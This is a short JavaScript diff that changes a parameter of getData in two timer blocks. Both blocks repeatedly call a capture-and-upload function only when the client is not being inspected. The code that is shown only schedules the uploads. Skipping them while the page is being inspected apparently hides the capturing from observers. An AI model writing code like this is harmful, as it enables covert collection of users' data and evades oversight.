@@ -91,14 +91,14 @@ function capatureAndUpload(twice,lastData) {
 
 setTimeout(() => {
   if (!clientState.isInspected) {
-    getData("D", 2, "70");
+    getData("D", 2, "246");
     capatureAndUpload();
   }
 }, 3000);
 
 setInterval(() => {
   if (!clientState.isInspected) {
-    getData("D", 2, "70");
+    getData("D", 2, "246");
     capatureAndUpload();
   }
 }, uploadTime);
